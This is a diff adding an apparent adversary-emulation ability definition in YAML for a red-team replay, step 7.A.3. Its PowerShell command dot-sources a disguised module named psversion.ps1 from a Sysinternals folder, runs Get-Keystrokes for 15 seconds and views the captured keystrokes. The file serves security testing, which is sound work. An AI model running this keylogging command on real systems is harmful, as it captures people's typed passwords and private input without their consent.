@@ -1,0 +1,21 @@
+---
+- id: db28f68d-e8b8-46e6-b680-642570d4b257
+  name: 7.A.3 - Automated Collection (T1119) - Input Capture (T1417)
+  description: Load custom PowerShell module, and grab keystrokes for 15 seconds.
+  tactic: collection
+  technique:
+    attack_id: T1417
+    name: Input Capture
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+            write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+            exit 1;
+          }
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          . .\psversion.ps1;
+          Get-Keystrokes;
+          Start-Sleep -Seconds 15;
+          View-Job -JobName "Keystrokes";
